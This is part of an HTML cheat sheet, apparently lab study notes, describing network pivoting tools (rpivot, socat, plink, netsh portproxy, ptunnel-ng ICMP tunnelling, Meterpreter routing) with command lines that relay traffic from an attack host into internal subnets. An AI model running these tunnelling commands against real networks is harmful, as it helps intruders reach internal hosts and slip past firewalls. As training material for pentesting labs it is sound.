+  <div class="detail-header">
+    <div class="detail-icon" style="background:#2d1414">🐍</div>
+    <div><h2>rpivot</h2><div class="subtitle">Python-based reverse SOCKS proxy — no GLIBC, works where Python exists</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Protocol</div><div class="value">HTTP</div></div>
+    <div class="info-item"><div class="label">Proxy type</div><div class="value">SOCKS4</div></div>
+    <div class="info-item"><div class="label">Python needed on pivot</div><div class="value" style="color:var(--orange)">Yes (Python 2)</div></div>
+    <div class="info-item"><div class="label">Binary needed</div><div class="value" style="color:var(--green)">No — pure Python</div></div>
+    <div class="info-item"><div class="label">GLIBC issues</div><div class="value" style="color:var(--green)">None</div></div>
+    <div class="info-item"><div class="label">Direction</div><div class="value">Reverse (pivot calls attacker)</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>Target has Python but you can't run Go/C binaries (GLIBC mismatch)</li>
+    <li>Only HTTP is allowed outbound through firewall</li>
+    <li>Firewall blocks inbound to pivot — rpivot is reverse by default</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">ON ATTACK HOST (server)</div>
+  <pre><span class="c-cmd">python2 server.py</span> <span class="c-flag">--proxy-port</span> <span class="c-val">9050</span> <span class="c-flag">--server-port</span> <span class="c-val">9999</span> <span class="c-flag">--server-ip</span> <span class="c-val">0.0.0.0</span></pre>
+  <div class="cmd-label">ON PIVOT HOST (client)</div>
+  <pre><span class="c-cmd">python2 client.py</span> <span class="c-flag">--server-ip</span> <span class="c-val">10.10.14.x</span> <span class="c-flag">--server-port</span> <span class="c-val">9999</span></pre>
+  <div class="cmd-label">PROXYCHAINS CONFIG</div>
+  <pre><span class="c-comment"># /etc/proxychains.conf:</span>
+socks4 127.0.0.1 9050   <span class="c-comment"># note: socks4 not socks5</span></pre>
+</div>
+
+<!-- SOCAT -->
+<div id="tab-socat" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#1c2820">🔌</div>
+    <div><h2>socat</h2><div class="subtitle">TCP port relay — simple single-port forwarding, often pre-installed</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Type</div><div class="value">Port relay (not SOCKS)</div></div>
+    <div class="info-item"><div class="label">Often pre-installed</div><div class="value" style="color:var(--green)">Yes on many Linux systems</div></div>
+    <div class="info-item"><div class="label">SOCKS proxy</div><div class="value" style="color:var(--red)">No</div></div>
+    <div class="info-item"><div class="label">Root required</div><div class="value" style="color:var(--green)">No</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>You only need to forward one specific port (e.g. RDP 3389)</li>
+    <li>socat is already on the pivot — no transfer needed</li>
+    <li>Quick relay without any proxy setup</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">FORWARD PORT ON PIVOT (relay RDP to DC)</div>
+  <pre><span class="c-comment"># On pivot — listen on 33389, forward to DC:3389</span>
+<span class="c-cmd">socat</span> TCP-LISTEN:<span class="c-val">33389</span>,fork TCP:<span class="c-val">172.16.5.19</span>:<span class="c-val">3389</span></pre>
+  <div class="cmd-label">THEN RDP FROM ATTACK HOST</div>
+  <pre><span class="c-cmd">xfreerdp</span> <span class="c-flag">/v:</span><span class="c-val">10.129.x.x:33389</span> <span class="c-flag">/u:</span>victor <span class="c-flag">/p:</span>pass@123 <span class="c-flag">/cert:ignore</span></pre>
+</div>
+
+<!-- PLINK -->
+<div id="tab-plink" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#1f1040">🪟</div>
+    <div><h2>plink (PuTTY Link)</h2><div class="subtitle">Windows CLI SSH — use on Windows pivots where OpenSSH isn't available</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Platform</div><div class="value">Windows pivot host</div></div>
+    <div class="info-item"><div class="label">Protocol</div><div class="value">SSH</div></div>
+    <div class="info-item"><div class="label">Proxy type</div><div class="value">SOCKS5 / port forward</div></div>
+    <div class="info-item"><div class="label">SSH needed</div><div class="value" style="color:var(--orange)">Yes — on attack host</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>You have a Windows pivot and can't use OpenSSH</li>
+    <li>You need dynamic SOCKS proxy from a Windows host</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">DYNAMIC PORT FORWARD FROM WINDOWS PIVOT</div>
+  <pre><span class="c-comment">REM On Windows pivot — calls back to attack host</span>
+<span class="c-cmd">plink.exe</span> <span class="c-flag">-D</span> <span class="c-val">1080</span> <span class="c-flag">-l</span> kali <span class="c-flag">-pw</span> password <span class="c-val">10.10.14.x</span> <span class="c-flag">-N</span></pre>
+  <div class="cmd-label">LOCAL PORT FORWARD</div>
+  <pre><span class="c-cmd">plink.exe</span> <span class="c-flag">-L</span> <span class="c-val">3389</span>:<span class="c-val">172.16.5.19</span>:<span class="c-val">3389</span> ubuntu@<span class="c-val">10.10.14.x</span> <span class="c-flag">-N</span></pre>
+</div>
+
+<!-- NETSH -->
+<div id="tab-netsh" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#1f1040">🪟</div>
+    <div><h2>netsh portproxy</h2><div class="subtitle">Windows built-in port forwarding — zero extra tools, admin required</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Platform</div><div class="value">Windows only (native)</div></div>
+    <div class="info-item"><div class="label">Type</div><div class="value">Port relay</div></div>
+    <div class="info-item"><div class="label">Extra tools</div><div class="value" style="color:var(--green)">None — Windows built-in</div></div>
+    <div class="info-item"><div class="label">Admin required</div><div class="value" style="color:var(--red)">Yes</div></div>
+    <div class="info-item"><div class="label">SOCKS proxy</div><div class="value" style="color:var(--red)">No</div></div>
+    <div class="info-item"><div class="label">Persistent</div><div class="value" style="color:var(--green)">Yes (survives reboot)</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>Windows pivot host and you have admin/SYSTEM</li>
+    <li>Cannot transfer any binary</li>
+    <li>Forwarding a specific port to an internal host</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">ADD PORT FORWARD RULE</div>
+  <pre><span class="c-comment">REM Forward local 8080 → internal DC RDP</span>
+<span class="c-cmd">netsh interface portproxy add v4tov4</span> <span class="c-flag">listenport=</span><span class="c-val">8080</span> <span class="c-flag">listenaddress=</span><span class="c-val">0.0.0.0</span> <span class="c-flag">connectport=</span><span class="c-val">3389</span> <span class="c-flag">connectaddress=</span><span class="c-val">172.16.5.19</span></pre>
+  <div class="cmd-label">VIEW ALL RULES</div>
+  <pre><span class="c-cmd">netsh interface portproxy show v4tov4</span></pre>
+  <div class="cmd-label">DELETE RULE</div>
+  <pre><span class="c-cmd">netsh interface portproxy delete v4tov4</span> <span class="c-flag">listenport=</span><span class="c-val">8080</span> <span class="c-flag">listenaddress=</span><span class="c-val">0.0.0.0</span></pre>
+</div>
+
+<!-- ICMP -->
+<div id="tab-icmp" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#2d1a00">📡</div>
+    <div><h2>ICMP Tunneling</h2><div class="subtitle">Hides traffic in ping packets — last resort when only ICMP is allowed</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Protocol</div><div class="value">ICMP (ping packets)</div></div>
+    <div class="info-item"><div class="label">Tools</div><div class="value">ptunnel-ng, icmpsh</div></div>
+    <div class="info-item"><div class="label">Root required</div><div class="value" style="color:var(--red)">Yes (raw sockets)</div></div>
+    <div class="info-item"><div class="label">Speed</div><div class="value" style="color:var(--red)">Very slow</div></div>
+    <div class="info-item"><div class="label">Detection risk</div><div class="value" style="color:var(--red)">High (unusual ICMP)</div></div>
+    <div class="info-item"><div class="label">Use case</div><div class="value">Last resort only</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>Absolutely nothing else works — ICMP is the only allowed protocol</li>
+    <li>Firewall blocks all TCP/UDP but allows ping</li>
+  </ul></div>
+  <div class="avoid"><h4>✗ Avoid when</h4><ul>
+    <li>Any other option exists — ICMP is slow, noisy, and detectable</li>
+    <li>You don't have root on both ends</li>
+  </ul></div>
+  <div class="section-title">Commands (ptunnel-ng)</div>
+  <div class="cmd-label">SERVER (on pivot)</div>
+  <pre><span class="c-cmd">sudo ptunnel-ng</span></pre>
+  <div class="cmd-label">CLIENT (on attack host)</div>
+  <pre><span class="c-cmd">sudo ptunnel-ng</span> <span class="c-flag">-p</span> <span class="c-val">10.129.x.x</span> <span class="c-flag">-l</span> <span class="c-val">2222</span> <span class="c-flag">-r</span> <span class="c-val">10.129.x.x</span> <span class="c-flag">-R</span> <span class="c-val">22</span>
+<span class="c-comment"># Then SSH through the ICMP tunnel:</span>
+<span class="c-cmd">ssh</span> <span class="c-flag">-p</span> <span class="c-val">2222</span> <span class="c-flag">-D 1080</span> ubuntu@<span class="c-val">127.0.0.1</span></pre>
+</div>
+
+<!-- METERPRETER -->
+<div id="tab-meterpreter" class="content">
+  <div class="detail-header">
+    <div class="detail-icon" style="background:#2d1414">🎯</div>
+    <div><h2>Meterpreter Pivoting</h2><div class="subtitle">All-in-one Metasploit pivoting — route, portfwd, and socks_proxy modules</div></div>
+  </div>
+  <div class="info-grid">
+    <div class="info-item"><div class="label">Framework</div><div class="value">Metasploit</div></div>
+    <div class="info-item"><div class="label">Proxy type</div><div class="value">SOCKS5 (socks_proxy module)</div></div>
+    <div class="info-item"><div class="label">Extra tools</div><div class="value" style="color:var(--green)">None beyond Metasploit</div></div>
+    <div class="info-item"><div class="label">Needs proxychains</div><div class="value" style="color:var(--orange)">Yes (for non-MSF tools)</div></div>
+    <div class="info-item"><div class="label">OS support</div><div class="value">Any Meterpreter session</div></div>
+    <div class="info-item"><div class="label">Root required</div><div class="value" style="color:var(--green)">No</div></div>
+  </div>
+  <div class="when-to-use"><h4>✓ Use when</h4><ul>
+    <li>You already have a Meterpreter session — stay in the framework</li>
+    <li>You want to use Metasploit modules against internal targets</li>
+    <li>Need a quick port forward without extra tools</li>
+  </ul></div>
+  <div class="section-title">Commands</div>
+  <div class="cmd-label">METHOD 1 — route + socks_proxy (full SOCKS)</div>
+  <pre><span class="c-comment"># In meterpreter session:</span>
+meterpreter » <span class="c-cmd">run post/multi/manage/autoroute</span> <span class="c-flag">SUBNET=</span><span class="c-val">172.16.5.0/24</span>
+
+<span class="c-comment"># In msf console:</span>
+msf6 » <span class="c-cmd">use auxiliary/server/socks_proxy</span>
+msf6 » <span class="c-cmd">set SRVPORT</span> <span class="c-val">1080</span>
+msf6 » <span class="c-cmd">set VERSION</span> <span class="c-val">5</span>
+msf6 » <span class="c-cmd">run -j</span>
+
+<span class="c-comment"># proxychains.conf: socks5 127.0.0.1 1080</span>
+<span class="c-cmd">proxychains</span> xfreerdp <span class="c-flag">/v:</span><span class="c-val">172.16.5.19</span> <span class="c-flag">/u:</span>victor <span class="c-flag">/cert:ignore</span></pre>
+  <div class="cmd-label">METHOD 2 — portfwd (single port)</div>
+  <pre><span class="c-comment"># Forward local 3389 → internal 172.16.5.19:3389</span>
+meterpreter » <span class="c-cmd">portfwd add</span> <span class="c-flag">-l</span> <span class="c-val">3389</span> <span class="c-flag">-p</span> <span class="c-val">3389</span> <span class="c-flag">-r</span> <span class="c-val">172.16.5.19</span>
+<span class="c-cmd">xfreerdp</span> <span class="c-flag">/v:</span><span class="c-val">127.0.0.1</span> <span class="c-flag">/u:</span>victor <span class="c-flag">/p:</span>pass@123 <span class="c-flag">/cert:ignore</span></pre>
+</div>
+
+<script>
+function showTab(name) {
+  document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  const el = document.getElementById('tab-' + name);
+  if (el) el.classList.add('active');
+  const tabs = document.querySelectorAll('.tab');
+  tabs.forEach(t => { if (t.getAttribute('onclick') === `showTab('${name}')`) t.classList.add('active'); });
+}
+</script>
+</body>
+</html>
